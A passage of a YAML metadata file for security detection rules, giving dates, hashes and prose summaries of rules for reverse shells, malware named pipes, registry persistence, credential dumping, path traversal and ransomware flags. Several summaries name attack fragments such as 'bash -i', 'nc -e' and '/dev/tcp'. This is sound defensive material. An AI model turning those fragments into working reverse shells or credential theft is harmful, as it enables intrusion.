  Ruleset: core
  Summary: This rule detects suspicious shell commands or program code executed via
    command line that may establish a reverse shell. It tracks specific patterns indicative
    of reverse shell activity, such as the use of TCP or UDP outbound connections
    with Bash, Netcat (nc), and other utilities. Reverse shell commands can be identified
    by strings like 'bash -i', 'nc -e', and sequences involving '/dev/tcp' or '/dev/udp'.
    Additionally, it recognizes methods related to redirection, socket creation, and
    certain Perl and Python execution patterns that are typically employed to initiate
    reverse shells.
  Updated-Date: '2024_09_03'
739915e4-1e70-4778-8b8a-17db02f66db1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea5d26f79f25b8f4662aa21ebd40d750
  Ruleset: emerging-threats
  Summary: "This rule detects named pipes associated with samples of Turla, a sophisticated\
    \ cyber-espionage group. Specifically, it looks for named pipes such as \\atctl,\
    \ \\comnap, \\iehelper, \\sdlrpc, and \\userpipe, which have been identified in\
    \ various research and analysis reports as being utilized by Turla malware. The\
    \ detection process relies on monitoring named pipe creation events on Windows\
    \ systems, which requires proper configuration of Sysmon to capture relevant events.\
    \ The goal is to identify potential malicious activities indicative of Turla\u2019\
    s operational tools and techniques used for execution and persistence within a\
    \ network."
  Updated-Date: '2024_09_03'
73a883d0-0348-4be4-a8d8-51031c2564f8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0f9f47fbca9ca0147e0251084fd936aa
  Ruleset: core
  Summary: This rule detects potential persistence attempts by monitoring modifications
    to the Windows telemetry registry key. Specifically, it targets changes involving
    the binary file CompatTelRunner.exe, which is used for telemetry data collection
    but also can execute any command specified in the registry without location or
    type restrictions. By examining entries under the \SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\AppCompatFlags\TelemetryController subkey and looking for command
    extensions such as .bat, .exe, .dll, and other executable formats, the rule aims
    to identify unauthorized or suspicious behavior indicative of persistence techniques.
  Updated-Date: '2024_09_03'
73bba97f-a82d-42ce-b315-9182e76c57b1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b3bac5027694ae6c9f10226ff3dbb58a
  Ruleset: sigmahq
  Summary: This rule detects the import of a specified file to the Windows registry
    using regedit.exe, focusing on command lines that include indicators such as '/i',
    '/s', and '.reg'. It aims to identify potential unauthorized or malicious registry
    modifications for defense evasion. The rule applies filters to exclude benign
    activities or legitimate uses, like Evernote functioning, distinguishing these
    from suspicious behavior. Key attributes to monitor include the parent image and
    command line parameters used during the registry import process.
  Updated-Date: '2024_09_04'
73c59189-6a6d-4b9f-a748-8f6f9bbed75c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4931060cb19ebb2fc4798900e0ce7a97
  Ruleset: emerging-threats
  Summary: This rule detects Microsoft Outlook initiating a connection to a WebDAV
    or SMB share, which could indicate an attempt to exploit CVE-2023-23397, a critical
    Outlook vulnerability. The detection focuses on specific Windows security events,
    the process name "OUTLOOK.EXE," and particular registry keys associated with network
    providers. It identifies attempts where the access list includes querying key
    values. The rule highlights that legitimate processes like Searchprotocolhost.exe
    may also interact with these registry keys, so filtering these events is recommended
    to reduce false positives.
  Updated-Date: '2024_09_03'
73d70463-75c9-4258-92c6-17500fe972f2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 54245afb86fdd79e9575a0c63f57702c
  Ruleset: emerging-threats
  Summary: This rule detects specific process characteristics of the Winnti Pipemon
    malware as reported by ESET. It identifies instances where processes are executed
    with command lines containing 'setup0.exe -p' or 'setup.exe' ending with flags
    such as '-x:0', '-x:1', or '-x:2'. These command lines are indicative of the defense
    evasion techniques employed by the Winnti Group, categorized under attack techniques
    T1574.002 and G0044. Despite possible overlaps with legitimate setups that use
    similar command line flags, the detection level is marked critical due to the
    threat's severity.
  Updated-Date: '2024_09_03'
73e67340-0d25-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27ae39dcb26851702afaa151886972dc
  Ruleset: core
  Summary: This rule detects the obfuscated use of Clip.exe to execute PowerShell
    commands. It identifies specific patterns in PowerShell script block text that
    indicate the chaining of Clip.exe with PowerShell to evade detection and execute
    code. This technique is often associated with defense evasion and potentially
    malicious activity.
  Updated-Date: '2024_09_03'
74176142-4684-4d8a-8b0a-713257e7df8e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0bfeef275e56e2af6d172c95f089c1f
  Ruleset: sigmahq
  Summary: This rule detects the use of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dll"
    DLL, which is commonly used by attackers to perform Active Directory enumeration.
    The detection focuses on the presence of specific payloads that include the import
    commands and the target DLL. Although this activity can be legitimate for administrative
    purposes, it often signals reconnaissance or discovery activity by malicious actors.
  Updated-Date: '2024_09_04'
7417e29e-c2e7-4cf6-a2e8-767228c64837:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7c4966515ca658345e7413eaf08595c6
  Ruleset: sigmahq
  Summary: This rule detects the loading of the Kerberos DLL by an Office application.
    The specific Office products monitored include Excel, Publisher, OneNote, Outlook,
    PowerPoint, and Word. This activity might indicate the use of Kerberos authentication-related
    functions within these applications, potentially pointing to suspicious or unauthorized
    operations.
  Updated-Date: '2024_09_04'
74298991-9fc4-460e-a92e-511aa60baec1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5fabaed3da90da998c7a0fe2e13db66
  Ruleset: sigmahq
  Summary: This rule detects when a new owner is added to an application. This event
    grants the specified account privileges to make modifications and configuration
    changes to the application.
  Updated-Date: '2024_09_04'
74403157-20f5-415d-89a7-c505779585cf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bd3772e3074862567db315a91bdcbbae
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "ConvertTo-SecureString" cmdlet via
    the command line. This cmdlet, which is responsible for converting plain text
    to a secure string, is relatively uncommon in standard operations and may indicate
    possible suspicious activity when observed.
  Updated-Date: '2024_09_04'
744a188b-0415-4792-896f-11ddb0588dbc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e84260253c733aa7c1ad52dcf79537ee
  Ruleset: core
  Summary: This rule detects potential process injection via Microsoft Remote Assistance
    (Msra.exe) by identifying suspicious child processes originating from it. The
    rule monitors for specific processes such as arp.exe, cmd.exe, net.exe, netstat.exe,
    nslookup.exe, route.exe, schtasks.exe, and whoami.exe, which may indicate malicious
    activity. Msra.exe has been exploited by various threat actors for discovery and
    persistence tactics.
  Updated-Date: '2024_09_03'
7453575c-a747-40b9-839b-125a0aae324b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 344b1fe9f91c74d1368138508483670f
  Ruleset: emerging-threats
  Summary: This rule detects command line indicators of a phishing campaign attributed
    to APT 29 (Cozy Bear) as reported by Mandiant. The detection focuses on specific
    patterns within command line arguments, such as the presence of '-noni -ep bypass
    $' and another that includes 'cyzfc.dat,' along with 'PointFunctionCall.' The
    rule is designed to identify malicious activities aiming at defense evasion and
    execution, particularly linked to the 2018 APT 29 phishing campaign targeting
    U.S. think tanks, non-profits, and the public sector.
  Updated-Date: '2024_09_03'
745ea50b-9673-4ba7-9426-cb45cf4a8e6d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8a159ba30d48df239d4dbde2fa34c129
  Ruleset: emerging-threats
  Summary: This rule detects the execution of a binary used by the Lace Tempest malware
    loader based on its specific filename and hash. The binary, named 'user.exe',
    is located in the SysAid Server's Tomcat web application directory. The SHA256
    hash associated with the binary is B5ACF14CDAC40BE590318DEE95425D0746E85B1B7B1CBD14DA66F21F2522BF4D.
    This activity is notable for its potential link to further malware deployment.
  Updated-Date: '2024_09_03'
749c9f5e-b353-4b90-a9c1-05243357ca4b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2daa8ebf8582f03826516bf87c7d9913
  Ruleset: core
  Summary: This rule detects a suspicious local successful logon event where the Logon
    Package is Kerberos, the remote address is set to localhost, and the target user
    SID aligns with the built-in local Administrator account. This pattern may indicate
    an attempt to execute a Kerberos relay attack variant, aiming to elevate privileges
    locally from a domain-joined limited user to local System privileges.
  Updated-Date: '2024_09_03'
74a12f18-505c-4114-8d0b-8448dd5485c6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 187050205917cdeaed2783cb10068520
  Ruleset: core
  Summary: This rule detects the execution of Nimgrab, a tool associated with the
    Nim programming framework, specifically employed for downloading files. It identifies
    instances where the executable file named 'nimgrab.exe' is run, cross-referencing
    known file hashes including MD5, SHA256, and IMPHASH values. Nimgrab can be used
    for legitimate purposes by developers, but its detection is significant as it
    is also associated with command-and-control activities commonly observed in cyber-attacks.
  Updated-Date: '2024_09_03'
74ad4314-482e-4c3e-b237-3f7ed3b9ca8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 736853bcebd7a55056749a9beb54a6ad
  Ruleset: emerging-threats
  Summary: This rule detects suspicious activity related to Operation Wocao, a hacking
    group allegedly linked to China. Specifically, it identifies events where the
    process named "checkadmin.exe" is executed with a target username that starts
    with "Administr" within Windows security logs. This behavior aligns with techniques
    used for system discovery, defense evasion, and process execution as detailed
    in the Operation Wocao report.
  Updated-Date: '2024_09_03'
74babdd6-a758-4549-9632-26535279e654:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6b57f91bc70b59631fbda256d5b11642
  Ruleset: core
  Summary: This rule detects the creation of suspicious executable file names on Windows
    systems. It identifies files with specific extensions that are often associated
    with malicious activity, including filenames that mimic common folders or files
    and those that exploit unquoted service paths. Examples of such filenames include
    "\\$Recycle.Bin.exe", "\\Documents and Settings.exe", and "\\Recovery.exe". Identifying
    these file names helps in detecting potential privilege escalation and evasion
    tactics employed by malicious actors.
  Updated-Date: '2024_09_03'
74db3488-fd28-480a-95aa-b7af626de068:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9bf64685b1a164c26778ccf3515337e
  Ruleset: emerging-threats
  Summary: This rule detects LockerGoga ransomware activity by identifying specific
    command line arguments associated with its execution. LockerGoga is a type of
    ransomware known for encrypting files on infected systems and is typically used
    in targeted attacks against businesses. The rule focuses on the presence of particular
    command line parameters, namely "-i SM-tgytutrc -s", which are indicative of LockerGoga
    operations. Detecting these parameters can help in identifying and mitigating
    ransomware attacks at an early stage.
  Updated-Date: '2024_09_03'
75180c5f-4ea1-461a-a4f6-6e4700c065d4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce13eac45a41a83ea400446f22be4465
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the Windows Recall feature via registry
    manipulation. The feature can be activated by setting the registry value "DisableAIDataAnalysis"
    to "0". Enabling Windows Recall may be performed by adversaries during post-exploitation
    discovery and data collection activities. It assumes that Recall is initially
    disabled and is subsequently activated by the attacker.
  Updated-Date: '2024_09_04'
7530b96f-ad8e-431d-a04d-ac85cc461fdc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d6e0a75ce8e815c197e401747aa2c597
  Ruleset: core
  Summary: This rule detects the abuse of a custom file open handler that executes
    PowerShell commands on Windows systems. This method is often used by attackers
    for defense evasion and persistence. The detection focuses on specific registry
    key modifications that point to the execution of PowerShell with command arguments,
    a technique leveraged in malware campaigns such as SolarMarker.
  Updated-Date: '2024_09_03'
7530cd3d-7671-43e3-b209-976966f6ea48:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4c33092c1f4a0138abb73573cf6ffbf4
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed "CURL.exe" binary on Windows
    systems by examining specific fields in the Portable Executable (PE) metadata,
    specifically targeting the "OriginalFileName" and "Description" attributes. This
    can potentially indicate attempts to evade defenses by renaming legitimate tools,
    as curl is commonly used for transferring data with URLs and might be leveraged
    for malicious purposes.
  Updated-Date: '2024_09_04'
754ed792-634f-40ae-b3bc-e0448d33f695:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 02cabe337706b1224e25ff85f7fb1587
  Ruleset: core
  Summary: This rule detects suspicious or uncommon parent processes initiating PowerShell
    activities, which may indicate potential abuse or unauthorized execution. Specifically,
    it monitors processes such as 'tomcat' and applications ending in filenames like
    'amigo.exe', 'browser.exe', and 'chrome.exe', among others. Additionally, it looks
    for instances where PowerShell is invoked through specific command line arguments,
    like '/c powershell' or '/c pwsh', and verifies attributes such as the description
    being 'Windows PowerShell' or the product name indicating 'PowerShell Core 6'.
    This detection aims to identify anomalies that could be leveraged for malicious
    purposes, such as executing scripts or commands in an unauthorized manner.
  Updated-Date: '2024_09_03'
75578840-9526-4b2a-9462-af469a45e767:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f07e8b1e5ebc76da5ea87b298aecbe81
  Ruleset: emerging-threats
  Summary: This rule detects exploitation activity for the Serv-U software, specifically
    targeting the CVE-2021-35211 vulnerability, which has been associated with attacks
    by the threat group DEV-0322. Indicators of such exploitation include the presence
    of the 'whoami' command and specific command line patterns related to directories
    within Serv-U and the execution of a 'Serv-U.bat' script in the Windows Temp folder.
    The detection is crucial due to the critical nature of this vulnerability and
    its potential impact on compromised systems.
  Updated-Date: '2024_09_03'
758ff488-18d5-4cbe-8ec4-02b6285a434f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4ab57219ad3d92a94d2faf817d0de906
  Ruleset: sigmahq
  Summary: This rule detects the execution of NetSupport, a remote access tool, by
    identifying specific processes associated with it. Adversaries may use legitimate
    remote access software like NetSupport to establish interactive command and control
    channels within target networks. This is often facilitated by leveraging the allowed
    application control within target environments. The rule focuses on processes
    named "PCICFGUI.EXE" originating from the company NetSupport Ltd to pinpoint potentially
    unauthorized use of this remote access tool.
  Updated-Date: '2024_09_04'
7595ba94-cf3b-4471-aa03-4f6baa9e5fad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 853d4102185f276cf5b9f99c61dfae50
  Ruleset: core
  Summary: This rule detects when adversaries attempt to conduct data destructive
    activities by deleting or disabling important scheduled tasks on a Windows system.
    Specifically, it monitors for events where tasks related to system restoration,
    Windows Defender, BitLocker, Windows Backup, Windows Update, the Update Orchestrator
    Schedule, and Exploit Guard are deleted or disabled. The detection relies on monitoring
    specific Event IDs and includes filtering out false positives, such as those during
    legitimate upgrades of Windows Defender, where its tasks might be temporarily
    removed and added.
  Updated-Date: '2024_09_03'
759d0d51-bc99-4b5e-9add-8f5b2c8e7512:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99eab6ae8ec00a742ce625c9c771c746
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new user account on a Linux system.
    Such accounts could be used for maintaining persistent access without deploying
    remote access tools. This detection leverages specific syscall and user addition
    record types, monitoring instances where the `/useradd` executable is used to
    create new user accounts. While legitimate administrative activities can trigger
    this detection, it signifies an important event for recognizing potential persistence
    mechanisms.
  Updated-Date: '2024_09_04'
75bf09fa-1dd7-4d18-9af9-dd9e492562eb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a323d45fb125ac190fbe423c70486daf
  Ruleset: sigmahq
  Summary: This rule detects the creation of an "Active Directory Schema Cache File"
    (.sch) file in the directory '\Local\Microsoft\Windows\SchCache\' by uncommon
    tools. The detection is tuned to exclude common and legitimate processes such
    as Cylance, client management software (e.g., System Center Configuration Manager),
    Windows system processes (like dllhost.exe and svchost.exe), PowerShell, SentinelOne,
    and Microsoft Office applications. This approach focuses on identifying potentially
    malicious activities, such as command-and-control operations over LDAP attributes,
    which might use unconventional or customized tools not typically associated with
    schema cache file creation. References provide context around specific exploitation
    techniques, such as those employed by LDAPFragger, showcasing the relevance to
    adversarial tactics.
  Updated-Date: '2024_09_04'
75bfe6e6-cd8e-429e-91d3-03921e1d7962:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 731067514356e287f8336a76f5ff6c5f
  Ruleset: sigmahq
  Summary: This rule detects the execution of the ScreenConnect program, a remote
    access tool, on a system by identifying specific command line patterns associated
    with its start. This activity could potentially indicate unauthorized remote access,
    highlighting a security concern for system integrity.
  Updated-Date: '2024_09_04'
75c505b1-711d-4f68-a357-8c3fe37dbf2d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7b7736be7e0c58f5b1668240b7e0969
  Ruleset: core
  Summary: This rule detects the loading activity of the SILENTTRINITY stager DLL
    on Windows systems. SILENTTRINITY is open-source, post-exploitation, command,
    and control framework that leverages the .NET framework. The detection identifies
    instances where the description contains 'st2stager', signaling potential malicious
    activity related to the SILENTTRINITY tool, which is used by attackers for unauthorized
    access and control of compromised systems.
  Updated-Date: '2024_09_03'
75d0a94e-6252-448d-a7be-d953dff527bb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e975e22a8f48d711029a35e2008d0658
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "msxsl.exe" binary with an "http"
    keyword in the command line, indicating a potential remote execution of XSL files.
    It focuses on recognizing when this specific Microsoft tool, which can process
    XSL transformations, is potentially manipulated to run scripts from remote sources.
    This behavior could be exploited for defense evasion or other malicious activities.
    The rule is designed to trigger alarms when such suspicious command line invocations
    are observed in a Windows process creation log.
  Updated-Date: '2024_09_04'
75e33ce3-ae32-4dcc-9aa8-a2a3029d6f84:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fcef7ffbbb5d51d680b0b9e996f21d4c
  Ruleset: sigmahq
  Summary: This rule detects an Office application (such as Word, Excel, or PowerPoint)
    initiating a network connection to non-local IP addresses. It specifically aims
    to identify traffic resembling exploits associated with CVE-2021-42292. The rule
    necessitates baseline establishment and tuning tailored to individual organizational
    needs.
  Updated-Date: '2024_09_04'
75e508f7-932d-4ebc-af77-269237a84ce1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9898a1348feae88b17b7da54b8b72198
  Ruleset: core
  Summary: This rule detects the execution of `cmstp.exe` loading `.dll` or `.ocx`
    files from suspicious locations such as `\PerfLogs\`, `\ProgramData\`, `\Users\`,
    `\Windows\Temp\`, or `C:\Temp\`. This behavior is monitored as it is indicative
    of potential defense evasion techniques commonly associated with malware exploiting
    signed binary proxy execution.
  Updated-Date: '2024_09_03'
75edd216-1939-4c73-8d61-7f3a0d85b5cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91a72194d294a7586c9e5518630ccf93
  Ruleset: sigmahq
  Summary: This rule detects the use of the .NET utility InstallUtil.exe for downloading
    arbitrary files. When InstallUtil.exe is utilized in this manner, the downloaded
    files are saved to the directory "%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\".
    This behavior may indicate an attempt to evade defenses or perform unauthorized
    activities, as InstallUtil.exe is typically not used for downloading files in
    legitimate scenarios.
  Updated-Date: '2024_09_04'
75edd3fd-7146-48e5-9848-3013d7f0282c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f90b27ed2c625ec39fac5aa173603d7d
  Ruleset: core
  Summary: This rule detects a DHCP server error where a specified Callout DLL, as
    indicated in the registry, failed to load on a Windows system. This error is identified
    through specific event IDs (1031, 1032, 1034) from the Microsoft-Windows-DHCP-Server
    provider. The detection helps in identifying potential issues related to defense
    evasion or malicious DLL injection, which can compromise the server's functionality.
  Updated-Date: '2024_09_03'
75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d6ee431246fa85c2133e2c11a11e57b
  Ruleset: sigmahq
  Summary: This rule detects applications attempting to modify the Windows registry
    to disable the write-protect feature for storage devices. This action can be indicative
    of preparatory steps taken by ransomware attacks or similar malicious activities,
    specifically those techniques observed in cyber-attacks by the cypherpunk group.
  Updated-Date: '2024_09_04'
760e75d8-c3b5-409b-a9bf-6130b4c4603f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fe5e16b61c1134e87e1be0689d3576a
  Ruleset: sigmahq
  Summary: This rule detects the creation of Self Extraction Directive files (.sed)
    in potentially suspicious locations on a Windows system. These files are utilized
    by the "iexpress.exe" utility to create self-extracting packages. Attackers have
    been observed abusing this utility to generate PE files embedded with ".sed" entries.
    The targeted directories include ProgramData, Temp, Windows\System32\Tasks, Windows\Tasks,
    Windows\Temp, and AppData\Local\Temp, which are unusual locations for legitimate
    .sed files.
  Updated-Date: '2024_09_04'
7610a4ea-c06d-495f-a2ac-0a696abcfd3b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 31a643f8e42f2752620031f90703935a
  Ruleset: sigmahq
  Summary: This rule detects instances where the "winlogon.exe" process initiates
    network communications with public IP addresses. The "winlogon.exe" process is
    a legitimate Windows process responsible for handling user logon and session management.
    However, its unexpected behavior of initiating outbound connections to public
    IP addresses may indicate malicious activity, such as attempts at command-and-control
    communication or execution of unauthorized commands. The rule specifically filters
    out connections to private and local IP ranges to focus on potentially suspicious
    traffic.
  Updated-Date: '2024_09_04'
762f2482-ff21-4970-8939-0aa317a886bb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5309f962fd1a7fc72d0f8f467b92a1a4
  Ruleset: core
  Summary: This rule detects the execution of Certify, a tool used for Active Directory
    certificate abuse, by analyzing specific PE metadata characteristics and common
    command line arguments. Certify is associated with various malicious activities
    such as credential access and system discovery. The rule focuses on identifying
    the presence of 'Certify.exe' through its image path and original file name, alongside
    specific command line arguments indicative of its use, such as options related
    to certificate services and templates. This tool is part of the GhostPack suite
    and can exploit vulnerabilities within certificate infrastructure, posing a high
    security risk.
  Updated-Date: '2024_09_03'
76737c19-66ee-4c07-b65a-a03301d1573d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4db15fae270837f004a18e586af8482b
  Ruleset: sigmahq
  Summary: This rule detects the deployment of container workloads in Google Cloud
    Platform (GCP) that are executed with the break-glass flag, which is used to bypass
    Binary Authorization controls. Such actions are typically recorded in the Google
    Cloud audit logs under the activity corresponding to Kubernetes cluster operations,
    specifically related to the creation of pods. The presence of the break-glass
    flag within these activities is flagged as a potential defense evasion technique.
  Updated-Date: '2024_09_04'
7679d464-4f74-45e2-9e01-ac66c5eb041a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 857b467432313c9a64307098b420d3d5
  Ruleset: core
  Summary: This rule detects the execution of SecurityXploded tools, specifically
    focusing on the 'PasswordDump.exe' program. SecurityXploded is known for providing
    various security and password recovery tools. The rule identifies instances where
    the 'PasswordDump.exe' file is executed, which is often associated with credential
    access activities. This detection is critical due to the potential for malicious
    use in unauthorized password retrieval.
  Updated-Date: '2024_09_03'
7692f583-bd30-4008-8615-75dab3f08a99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbe5ef2bae536bca24552808d40b134f
  Ruleset: sigmahq
  Summary: This rule detects the use of common commands that enable BPF (Berkeley
    Packet Filter) kprobes tracing. It identifies command lines containing specific
    patterns that involve writing to files within the system kernel's debug tracing
    directory related to kprobes, such as enabling a probe or a return probe. This
    activity is relevant to both execution and defense evasion techniques often associated
    with advanced tracing and diagnostics on Linux systems. References are provided
    to resources detailing offensive BPF use, bpftrace usage, and kernel documentation
    on kprobes tracing.
  Updated-Date: '2024_09_04'
76bc1601-9546-4b75-9419-06e0e8d10651:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d878a21bb15bb35ca219976ad4c0f47
  Ruleset: emerging-threats
  Summary: This rule detects potential malicious .ICO files being downloaded via web
    requests from a compromised 3CXDesktopApp. The downloads originate from a malicious
    GitHub repository, indicating a possible software supply chain attack targeting
    3CX software. The detection focuses on identifying specific URI patterns that
    include 'IconStorages/images/main/icon' and '.ico', which are characteristic of
    this attack vector.
  Updated-Date: '2024_09_03'
76f55eaa-d27f-4213-9d45-7b0e4b60bbae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e8961821c0921ba8dd7a209ffb40ec2
  Ruleset: sigmahq
  Summary: This rule detects attempts to use WMI (Windows Management Instrumentation)
    via WMIC.EXE to check the status of a specific service on a remote device. The
    outcome of the check can display whether the service information is available,
    not running, or if the remote host is unreachable, producing corresponding feedback
    or error messages like "No instance(s) Available" or "The RPC server is unavailable."
  Updated-Date: '2024_09_04'
7707a579-e0d8-4886-a853-ce47e4575aaa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8beb9dfd14a5f2d76884eb75bf611358
  Ruleset: core
  Summary: This rule detects a threat actor creating a file named `wbemcomn.dll` in
    the `C:\Windows\System32\wbem\` directory over the network and subsequently loading
    it to facilitate a WMI DLL Hijack scenario. This activity is indicative of an
    attack vector that involves executing malicious code by hijacking the Windows
    Management Instrumentation (WMI) service through the malicious DLL.
  Updated-Date: '2024_09_03'
771d1eb5-9587-4568-95fb-9ec44153a012:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 361f847b1f7178c775600b5bf0ceddfd
  Ruleset: core
  Summary: This rule detects the use of the NSudo tool for command execution, identifying
    processes created by NSudo executables such as NSudo.exe, NSudoLC.exe, and NSudoLG.exe.
    NSudo is used to execute commands with various system privileges, such as System,
    Trusted Installer, and Elevated privileges, as well as with enabled privileges
    and specific integrity levels. The detection looks for particular command line
    parameters that NSudo employs to adjust privilege levels, integrity levels, and
    window visibility settings. This activity may indicate malicious behavior such
    as privilege escalation or unauthorized system modifications.
  Updated-Date: '2024_09_03'
7745c2ea-24a5-4290-b680-04359cb84b35:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2b1f239605f4c1a6f1f4e231e65e552
  Ruleset: sigmahq
  Summary: This rule detects path traversal exploitation attempts by monitoring webserver
    logs for specific query patterns. These patterns include sequences like '../../../',
    which are used to navigate directories and potentially access restricted files
    or directories such as system passwords, Windows directories, or the /etc/ directory
    on Unix-based systems. This activity is often associated with attacks aiming to
    gain unauthorized access through web applications by manipulating URLs. The detection
    helps identify malicious attempts as well as potential false positives from legitimate
    vulnerability scanning tools.
  Updated-Date: '2024_09_04'
77564cc2-7382-438b-a7f6-395c2ae53b9a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ac66bb3a1a84946edf8900f2000d5de
  Ruleset: core
  Summary: This rule detects the creation of a remote thread in the KeePass.exe process,
    which may indicate potential password dumping activities. KeePass is a password
    manager, and such activities could signify an attempt to extract stored credentials,
    often associated with tools like KeeFarce and KeeThief. Monitoring for this behavior
    is crucial as it suggests unauthorized attempts to access sensitive password information
    via credential access techniques.
  Updated-Date: '2024_09_03'
77586a7f-7ea4-4c41-b19c-820140b84ca9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b47cb9d9f3b7a591df9513e75395ba1e
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation attempt of the VMware View Planner vulnerability
    identified as CVE-2021-21978. This vulnerability can be targeted through specific
    web server activities, with key indicators including a 'POST' request method and
    URI queries containing 'logupload', 'logMetaData', and 'wsgi_log_upload.py'. This
    rule is crucial for identifying initial access attempts related to this exploitation.
  Updated-Date: '2024_09_03'
7773b877-5abb-4a3e-b9c9-fd0369b59b00:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c3fcd114497eac2e62cf4f9993715e0b
  Ruleset: sigmahq
  Summary: This rule detects the execution of Windows Management Instrumentation Command-line
    (WMIC) to query information on a remote system. Specifically, it identifies instances
    where the WMIC executable (wmic.exe) is used with the command line parameter `/node:`
    to connect to a remote host, excluding cases where the node is set to local addresses
    like `127.0.0.1` or `localhost`. This behavior can be indicative of administrative
    activities or potential malicious actions, such as information gathering by an
    attacker.
  Updated-Date: '2024_09_04'
778ba9a8-45e4-4b80-8e3e-34a419f0b85e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ba42d403fd451ce83d6e195102d6fba
  Ruleset: sigmahq
  Summary: This rule detects DNS queries to specific TeamViewer domains, such as 'taf.teamviewer.com'
    and 'udp.ping.teamviewer.com', made by processes that are not named TeamViewer.
    This can indicate suspicious activities, as threat actors sometimes use non-TeamViewer
    applications to interact with TeamViewer domains for obfuscation purposes.
  Updated-Date: '2024_09_04'
77946e79-97f1-45a2-84b4-f37b5c0d8682:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f17a368b6b6ee9bc7ca559dde889f127
  Ruleset: core
